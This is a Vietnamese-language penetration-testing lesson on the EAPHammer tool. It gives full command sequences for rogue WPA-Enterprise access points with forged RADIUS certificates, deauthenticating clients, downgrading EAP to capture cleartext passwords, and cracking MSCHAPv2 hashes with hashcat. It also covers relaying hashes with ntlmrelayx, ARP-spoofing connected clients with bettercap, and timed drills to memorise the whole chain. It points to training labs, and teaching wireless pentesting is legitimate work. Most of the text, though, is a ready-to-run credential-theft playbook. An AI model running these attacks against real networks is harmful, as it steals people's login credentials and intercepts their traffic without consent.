---
title: "08. Tool: EAPHammer"
type: tool
tags: [pentest, wireless, eaphammer, wpa-enterprise, karma, mana, tool, lesson-08]
aliases: [EAPHammer]
created: 2026-04-01
---

> **Prerequisites**: [[04-karma-mana-attacks|04. Karma & MANA Attacks]] · [[05-evil-twin-wpa-enterprise|05. Evil Twin WPA-Enterprise]]
> **Objectives**:
> - Nắm vững toàn bộ EAPHammer workflow từ install đến credential capture
> - Hiểu các modes: Standard Evil Twin, Karma, MANA, Loud, Known Beacon
> - Thực hiện EAP certificate generation và management
> - Integrate EAPHammer với post-connection attacks

---

## Mục đích & Kiến trúc

**EAPHammer** (tác giả: s0lst1c3) là framework chuyên biệt cho WPA-Enterprise Evil Twin attacks. Nó đóng gói toàn bộ attack chain — từ rogue AP, fake RADIUS server, certificate management, Karma/MANA, đến credential capture — trong một công cụ duy nhất.

**Dựa trên**: hostapd-wpe (WPA Enterprise hack extension) + custom EAP implementation + MANA patches.

### Architecture nội bộ

```
EAPHammer
├── hostapd-eaphammer   ← Modified hostapd: rogue AP + 802.1X + MANA
├── RADIUS server       ← Fake authentication server (in-process)
├── DHCP (optional)     ← Built-in via dnsmasq integration
├── Certificate engine  ← Auto-generate fake certs
└── Credential logger   ← Capture MSCHAPv2, GTC, PAP hashes
```

**Supported EAP attack modes**:
- PEAP/MSCHAPv2 (phổ biến nhất)
- EAP-TTLS/MSCHAPv2
- EAP-TTLS/PAP (cleartext — downgrade target)
- EAP-TTLS/CHAP
- EAP-FAST/MSCHAPv2 (Phase 0 attack)
- EAP-GTC (force cleartext via downgrade)

**Rogue AP modes**:
- Standard Evil Twin (clone specific SSID)
- Karma (respond to all directed probes)
- MANA (reconstruct PNL, targeted responses)
- Loud MANA (union PNL broadcast)
- Known Beacon (brute-force SSIDs từ wordlist)

---

## Cài đặt & Setup

```bash
# Clone repo
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer

# Kali Linux setup (recommended — tự install dependencies)
sudo ./kali-setup

# Verify
sudo ./eaphammer --help
```

> [!warning] Python version
> EAPHammer yêu cầu Python 3. Nếu lỗi, kiểm tra: `python3 --version` và `pip3 install -r requirements.txt`.

### Certificate Generation (BẮT BUỘC trước mọi Enterprise attack)

```bash
# Interactive wizard (điền thông tin khi được hỏi)
sudo ./eaphammer --cert-wizard

# Non-interactive (nhanh hơn)
sudo ./eaphammer --cert-wizard \
    --cn "radius.corp.local" \
    --org "Corp Inc" \
    --country "US" \
    --state "CA" \
    --city "San Francisco"

# Verify certs generated
ls -la certs/
# ca.pem  server.pem  server-key.pem  dh.pem
```

> **Expected output**: `[*] Certificate generated: certs/ca.pem, certs/server.pem`.

> [!tip] Match CN với RADIUS server thật
> Nếu biết CN của RADIUS server thật (từ recon hoặc từ một cert capture), dùng cùng CN. Một số clients validate CN field → matching làm attack transparent hơn.

---

## Core Workflow

**Bước 1 — Reconnaissance**

```bash
# Xác định target AP
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
# Ghi: SSID, BSSID, Channel, AUTH (phải là MGT cho Enterprise)
```

> **Expected output**: AUTH=MGT xác nhận WPA-Enterprise.

**Bước 2 — Generate Certificates**

```bash
sudo ./eaphammer --cert-wizard --cn "radius.corp.local"
```

> **Expected output**: `[*] Certificates written to certs/`

**Bước 3 — Launch Attack**

```bash
# Standard WPA-Enterprise credential capture
sudo ./eaphammer \
    -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid "Corp-Enterprise" \
    --creds
```

> **Expected output**:
> ```
> [*] Starting rogue AP: Corp-Enterprise on channel 6
> [*] Waiting for clients to connect...
> ```

**Bước 4 — Deauth clients (terminal riêng)**

```bash
# Dùng wlan1 để deauth
sudo airmon-ng start wlan1
sudo aireplay-ng --deauth 0 -a <TARGET_BSSID> wlan1mon
```

> **Expected output**: Clients disconnect → reconnect → EAPHammer logs credentials.

**Bước 5 — Capture và Crack**

```bash
# EAPHammer output format (MSCHAPv2):
# [+] jsmith::CORP:a1b2c3d4e5f6a7b8:001122334455667788...:01

# Save to file và crack
sudo ./eaphammer ... --creds 2>&1 | tee eap_creds.txt

# Extract hashes
grep "::" eap_creds.txt > hashes.txt

# Crack
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Key Flags & Options

**Core flags**

| Flag | Ý nghĩa |
|------|---------|
| `-i <iface>` | Wireless interface cho rogue AP |
| `--channel <n>` | Channel của rogue AP (match target hoặc tự chọn) |
| `--essid <name>` | SSID của rogue AP |
| `--auth wpa-eap` | WPA-Enterprise mode |
| `--auth open` | Open network (cho Karma/MANA non-Enterprise) |
| `--creds` | Enable credential capture (EAP hash logging) |
| `--dhcp` | Enable built-in DHCP server cho clients |

**EAP Negotiation**

| Flag | Ý nghĩa |
|------|---------|
| `--negotiate weakest` | Force downgrade đến weakest EAP method (PAP/GTC) |
| `--negotiate gtc-downgrade` | Specifically target EAP-GTC (cleartext) |
| `--negotiate manual` | Specify EAP methods thủ công |

**Rogue AP Modes**

| Flag | Ý nghĩa |
|------|---------|
| `--karma` | Enable Karma attack (respond to all directed probes) |
| `--mana` | Enable MANA attack (PNL reconstruction) |
| `--loud` | Enable Loud MANA (union PNL broadcast) |
| `--known-beacons` | Known Beacon attack |
| `--known-ssids-file <f>` | Wordlist cho Known Beacon |
| `--cloaking full` | Ẩn SSID trong beacons (giảm noise) |
| `--cloaking partial` | Partial SSID cloaking |

**Certificate Flags**

| Flag | Ý nghĩa |
|------|---------|
| `--cert-wizard` | Interactive cert generation |
| `--cn <name>` | Common Name cho cert |
| `--org <name>` | Organization Name |
| `--country <cc>` | Country Code (2 letters) |

**Output Flags**

| Flag | Ý nghĩa |
|------|---------|
| `--loot-path <dir>` | Directory để save captured credentials |
| `--negotiate weakest` | Prefer cleartext methods |

---

## Common Patterns

**Pattern 1 — Quick WPA-Enterprise attack**

```bash
sudo ./eaphammer --cert-wizard --cn "radius.corp.local"
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corp-WiFi" --creds --dhcp
```

**Pattern 2 — MANA + Enterprise (auto-connect + harvest)**

```bash
sudo ./eaphammer -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid "Corp-WiFi" \
    --mana \
    --creds \
    --dhcp
```

**Pattern 3 — EAP Downgrade (get cleartext)**

```bash
sudo ./eaphammer -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid "Corp-WiFi" \
    --creds \
    --negotiate weakest \
    --dhcp
```

**Pattern 4 — Karma + Open (non-Enterprise pivot)**

```bash
sudo ./eaphammer -i wlan0 \
    --channel 6 \
    --auth open \
    --essid "FreeWiFi" \
    --karma \
    --dhcp
```

**Pattern 5 — Loud MANA + Enterprise**

```bash
sudo ./eaphammer -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid "Corp-Enterprise" \
    --mana \
    --loud \
    --creds \
    --dhcp
```

**Pattern 6 — Known Beacon + Open (public hotspot clone)**

```bash
sudo ./eaphammer -i wlan0 \
    --channel 6 \
    --auth open \
    --known-beacons \
    --known-ssids-file /opt/eaphammer/wordlists/known_ssids.txt \
    --dhcp
```

---

## Command Cheatsheet

**Installation & Setup**

```bash
git clone https://github.com/s0lst1c3/eaphammer && cd eaphammer
sudo ./kali-setup

# Generate certs
sudo ./eaphammer --cert-wizard --cn "radius.target.local" --org "TargetCorp" --country "US"
```

**Attack Commands**

```bash
# Standard Enterprise
sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --creds

# Enterprise + DHCP
sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --creds --dhcp

# EAP Downgrade (cleartext)
sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --creds --negotiate weakest

# MANA + Enterprise
sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --mana --creds --dhcp

# Loud MANA + Enterprise
sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --mana --loud --creds

# Karma + Open
sudo ./eaphammer -i wlan0 --channel CH --auth open --essid "SSID" --karma --dhcp

# Known Beacon
sudo ./eaphammer -i wlan0 --channel CH --auth open --known-beacons --known-ssids-file FILE --dhcp
```

**Crack Captured Hashes**

```bash
# MSCHAPv2 (NTLMv2)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv1
hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt

# Online crack (nếu offline fail)
# crack.sh (NTLMv1 → NT hash lookup)
```

**Combine với deauth**

```bash
# Terminal 2: Deauth clients khỏi legit AP
sudo airmon-ng start wlan1
sudo aireplay-ng --deauth 0 -a <TARGET_BSSID> wlan1mon
# Target specific client:
sudo aireplay-ng --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan1mon
```

---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 7 ngày đầu.

**Drill 1 — Cert-wizard + Standard attack từ memory**

```bash
sudo ./eaphammer --cert-wizard --cn "radius.target.local"
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corp" --creds --dhcp
```

Luyện cho đến khi: cả hai commands gõ chính xác trong dưới 15 giây mỗi cái.

**Drill 2 — Chọn đúng mode từ scenario**

Scenario → Mode:
- "Devices probe với SSIDs cụ thể, legacy OS" → `--karma`
- "Modern iOS/Android, broadcast probes" → `--mana`
- "Không có probe nào" → `--known-beacons`
- "Enterprise network, muốn cleartext" → `--creds --negotiate weakest`

Luyện cho đến khi: map scenario → flag trong dưới 5 giây.

**Drill 3 — Identify hash format và crack command**

```bash
# Từ EAPHammer output:
# jsmith::CORP:a1b2c3d4:00112233445566778899aabbccddeeff...:01
# → hashcat -m 5600

# vs plaintext (EAP-GTC downgrade):
# [+] Plaintext credential: CORP\jsmith : P@ssword2024
# → không cần crack
```

Luyện cho đến khi: phân biệt ngay lập tức hash vs plaintext output.

**Drill 4 — Full chain timed**

cert-wizard → attack → deauth → capture → crack: dưới 10 phút.

---

## Kết hợp với Tool khác

```
EAPHammer → aircrack-ng suite (deauth để force client connect)
EAPHammer → hashcat (crack captured MSCHAPv2 NTHash)
EAPHammer → impacket-ntlmrelayx (relay NTHash sang SMB nếu không crack được)
EAPHammer → bettercap (post-connection MitM sau khi client connect)
EAPHammer → hostapd-wpe (fallback nếu EAPHammer có lỗi dependency)
EAPHammer (--dhcp) → dnsmasq (thay thế nếu cần custom DHCP options)
```

```bash
# Pipeline: EAPHammer capture → bettercap post-connection
# Terminal 1: EAPHammer làm rogue AP
sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Corp" --creds --dhcp

# Terminal 2: Bettercap trên interface được tạo bởi EAPHammer
sudo bettercap -iface wlan0 -eval "net.sniff on; set arp.spoof.fullduplex true; arp.spoof on"
```

---

## Lab Thực hành

| Platform | Machine / Module | Tại sao phù hợp |
|----------|---------|----------------|
| HTB Academy | **Wi-Fi Evil Twin Attacks** | Section WPA-Enterprise với EAPHammer walkthrough |
| HTB Academy | **Wi-Fi Penetration Testing Tools & Techniques** | Tool comparison chapter, EAPHammer vs alternatives |
| HTB Academy | **Attacking Corporate Wi-Fi Networks** | Full corporate lab với Enterprise auth |
| Local VMs | FreeRADIUS + Windows + Kali | Setup legit RADIUS → practice full attack |

---

## Field Manual Entry

> [!abstract] EAPHammer — Quick Reference
> **Condition**: WPA-Enterprise target; hoặc Karma/MANA open network attack
> **Quick command**: `sudo ./eaphammer -i wlan0 --channel CH --auth wpa-eap --essid "SSID" --creds --dhcp`
> **Cert setup**: `sudo ./eaphammer --cert-wizard --cn "radius.target.local"`
> **Full flow**: cert-wizard → eaphammer (rogue AP + RADIUS) → deauth clients → capture MSCHAPv2 → hashcat -m 5600
> **Downgrade**: `--negotiate weakest` → cleartext nếu client hỗ trợ GTC/PAP
> **Crack**: `hashcat -m 5600 hashes.txt rockyou.txt` (NTLMv2) hoặc `-m 5500` (NTLMv1)
> **Ref**: [[08-tool-eaphammer|08. Tool: EAPHammer]]
